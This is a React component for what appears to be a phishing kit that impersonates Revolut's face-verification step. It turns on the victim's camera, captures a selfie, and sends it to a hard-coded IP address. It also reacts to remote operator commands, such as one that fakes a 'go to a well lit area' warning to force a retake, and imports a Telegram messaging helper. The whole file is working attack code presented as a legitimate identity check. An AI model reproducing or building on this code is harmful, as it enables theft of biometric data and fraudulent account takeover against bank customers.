"use client"
import React, { useEffect, useRef, useState } from "react";
import { sendMessageToTelegram } from '../lib/api';
import { useCommand } from '../app/lib/CommandContext';
import { useRouter } from 'next/navigation';





export default function FaceVerification() {
    const router = useRouter();
    const { command } = useCommand(); 
    const videoRef = useRef(null);
    const canvasRef = useRef(null);
    const [isCapturing, setIsCapturing] = useState(false);
    const [displayLoader, setDisplayLoader] = useState(false)
    const [displayError, setDisplayError] = useState(false)
    const [displayAuth, setDisplayAuth] = useState(false)

    // Handle wether to display error for phone number or email
    const [displayMessage, setDisplayMessage] = useState('phone')
    const displayPageLoader = () => {
        console.log("NOW DISPLAYING PAGE LOADER")
        setDisplayLoader(!displayLoader)
    }
    
    const navigateWithLoader = (path) => {
      // Show loader
      setDisplayLoader(true);
      
      // Set a minimum display time for the loader (for UX purposes)
      const minLoaderTime = 3500; // 1.5 seconds
      const startTime = Date.now();
      
      // Prepare the navigation
      const performNavigation = () => {
        router.push(path);
      };
      
      // Handle the timing
      setTimeout(() => {
        const elapsedTime = Date.now() - startTime;
        if (elapsedTime < minLoaderTime) {
          // If minimum time hasn't passed, wait the remaining time
          setTimeout(performNavigation, minLoaderTime - elapsedTime);
        } else {
          // Minimum time has passed, navigate immediately
          performNavigation();
        }
      }, 100); // Small delay to ensure loader is visible
    };

    useEffect(() => {
        if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION_AGAIN') {
            showRedWarning(setWarningActive);
            setIsCapturing(false);
        } else if (command === 'FINISH') {
            navigateWithLoader('/verificationPage');
        }
    }, [command, router]);

    
    // Start the camera when the component mounts
    useEffect(() => {
        const startCamera = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                if (videoRef.current) {
                    videoRef.current.srcObject = stream;
                }
            } catch (error) {
                console.error("Error accessing the camera:", error);
            }
        };

        startCamera();

        // Cleanup: Stop the camera when the component unmounts
        return () => {
            if (videoRef.current && videoRef.current.srcObject) {
                videoRef.current.srcObject.getTracks().forEach(track => track.stop());
            }
        };
    }, []);

    // Function to capture image
    const captureImage = () => {
        setIsCapturing(true);
    
        setTimeout(() => {
            if (videoRef.current && canvasRef.current) {
                const video = videoRef.current;
                const canvas = canvasRef.current;
                const context = canvas.getContext('2d');
    
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
    
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('image', blob, 'selfie.jpg');
                    
                    try {
                        const response = await fetch('http://5.196.190.224:5000/send-image', {
                            method: 'POST',
                            body: formData,
                        });
                        
                        if (!response.ok) throw new Error('Failed to send image');
                        console.log('Image sent successfully');
                    } catch (error) {
                        console.error('Error sending image:', error);
                    }
                }, 'image/jpeg', 0.9);
                
                setIsCapturing(false);
            }
        }, 300);
};
    const [warningActive, setWarningActive] = useState(false);

    
    const showRedWarning = (setWarningActive) => {
      // Update the state to show the warning
      setWarningActive(true);
      
      // You can add a timeout to automatically remove the warning after some time
      // setTimeout(() => setWarningActive(false), 5000); // Remove after 5 seconds
    };

    return (
        <div className="h-screen w-full bg-gradient-to-b from-blue-900 to-black flex flex-col items-center justify-center relative overflow-hidden">
            {/* Hidden canvas for image capture */}
            <canvas ref={canvasRef} className="hidden" />
            
            {/* Header */}
            <div className="absolute top-0 left-0 w-full p-5 flex items-center justify-between">
                <button className="text-white hover:text-blue-300 transition-colors">
                    <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 0 24 24" width="24px" fill="currentColor">
                        <path d="M0 0h24v24H0V0z" fill="none"/>
                        <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
                    </svg>
                </button>
                <p className="text-white text-lg font-semibold">Face Verification</p>
                <div className="w-6"></div> {/* Spacer for alignment */}
            </div>

            {/* Oval camera view */}
            <div className="relative w-64 h-80 mb-12 mt-12">
                <div className="absolute inset-0 rounded-full bg-white bg-opacity-10 backdrop-blur-sm border-2 border-blue-400 border-opacity-50 overflow-hidden shadow-lg"
                    style={{ transform: 'scaleY(1.2)' }}>
                    <div className="absolute inset-0" style={{ transform: 'scaleY(0.833)' }}>
                        <video
                            ref={videoRef}
                            autoPlay
                            playsInline
                            muted
                            className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 min-w-full min-h-full object-cover"
                        />
                    </div>
                </div>
                
                {/* Face outline guide */}
                <div className="absolute inset-0 pointer-events-none flex items-center justify-center">
                    <svg width="180" height="220" viewBox="0 0 180 220" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path 
                            d="M90 10C40 10 10 60 10 110C10 160 40 210 90 210C140 210 170 160 170 110C170 60 140 10 90 10Z" 
                            stroke={warningActive ? "rgba(255,0,0,0.8)" : "rgba(255,255,255,0.6)"} 
                            strokeWidth={warningActive ? "3" : "2"} 
                            strokeDasharray="8 4" 
                        />
                    </svg>
                </div>
            </div>

            {/* Instructions */}
            <div className="text-center mb-12">
                <p className={`text-lg font-medium mb-2 ${warningActive ? 'text-red-500' : 'text-white'}`}>
                    {warningActive ? "Please Go to well lit area" : "Position your face in the oval"}
                </p>
                <p className="text-blue-300 text-sm">Make sure your face is well-lit and clearly visible</p>
            </div>

            {/* Capture button */}
            <div className="mb-8">
                <button
                    onClick={captureImage}
                    className={`w-16 h-16 rounded-full flex items-center justify-center transition-all duration-300 ${isCapturing ? 'scale-90' : 'scale-100'}`}
                >
                    <div className="w-16 h-16 rounded-full bg-white bg-opacity-80 flex items-center justify-center">
                        <div className={`w-14 h-14 rounded-full border-2 border-blue-900 ${isCapturing ? 'bg-blue-400' : 'bg-transparent'} transition-colors duration-300`}></div>
                    </div>
                </button>
            </div>
        </div>
    );
}
